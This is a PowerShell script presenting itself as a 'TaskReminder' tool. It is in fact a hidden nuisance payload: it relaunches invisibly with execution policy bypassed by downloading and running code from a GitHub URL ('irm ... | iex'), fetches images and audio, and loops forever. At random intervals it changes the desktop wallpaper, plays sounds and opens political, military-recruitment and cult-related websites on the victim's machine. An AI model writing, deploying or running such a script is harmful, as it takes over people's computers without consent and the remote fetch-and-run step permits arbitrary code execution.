# ================= CONFIG =================
$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"

$Sites = @{
    1 = "https://heavensgate.com/"
    2 = "https://action.aipac.org/aipac-pac-donate"
    3 = "https://www.palantir.com/careers/"
    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
}

$MinSeconds  = 10
$MaxSeconds  = 120
$Volume      = 0.5
$AvoidRepeat = $true
$ShowConsole = $false   # set to $true when debugging in a visible window
# ==========================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Dir = Join-Path $env:TEMP "TaskReminder"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null
$LogFile = Join-Path $Dir "log.txt"

function Log($m) {
    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
    if ($ShowConsole) { Write-Host $m }
}

# Relaunch fully detached and hidden, so no terminal stays open
if (-not $ShowConsole -and -not $env:TR_CHILD) {
    $launched = $false
    $url = "$BaseUrl/reminders.ps1"
    $cmd = "powershell -ExecutionPolicy Bypass -Command `"`$env:TR_CHILD=1; irm $url | iex`""

    try {
        $si  = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property @{ ShowWindow = [uint16]0 }
        $res = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $cmd; ProcessStartupInformation = $si }
        if ($res.ReturnValue -eq 0) { $launched = $true; Log "Relaunched detached (PID $($res.ProcessId))" }
        else { Log "CIM launch failed, code $($res.ReturnValue)" }
    } catch { Log "CIM launch error: $($_.Exception.Message)" }

    if (-not $launched) {
        try {
            $env:TR_CHILD = 1
            Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm $url | iex`""
            $launched = $true
            Log "Relaunched with Start-Process (fallback)"
        } catch { Log "Fallback launch error: $($_.Exception.Message)" }
    }

    if ($launched) { exit }
    Log "Could not relaunch hidden, running in this window instead."
}

Log "--- started. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"

# Only one copy at a time
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
$PID | Out-File (Join-Path $Dir "pid.txt")

# Download assets
foreach ($i in 1..5) {
    foreach ($f in "image$i.jpg", "audio$i.wav") {
        $dest = Join-Path $Dir $f
        if (-not (Test-Path $dest)) {
            try {
                Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $dest -ErrorAction Stop
                Log "Downloaded $f"
            } catch { Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)" }
        }
    }
}

# Wallpaper support
$wpOk = $false
try {
    Add-Type @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@ -ErrorAction Stop
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
    $wpOk = $true
} catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }

# Audio support
$player = $null
try {
    Add-Type -AssemblyName PresentationCore -ErrorAction Stop
    $player = New-Object System.Windows.Media.MediaPlayer
} catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }

# Main loop
$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x
    Log "Task $x"

    if ($wpOk) {
        try {
            $img = Join-Path $Dir "image$x.jpg"
            $r = [WP]::SystemParametersInfo(20, 0, $img, 3)
            if (-not $r) { Log "Wallpaper call returned 0 for $img" }
        } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
    }

    if ($player) {
        try {
            $player.Open([Uri](Join-Path $Dir "audio$x.wav"))
            $player.Volume = $Volume
            $player.Play()
        } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
    }

    try { Start-Process $Sites[$x] -ErrorAction Stop }
    catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }

    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
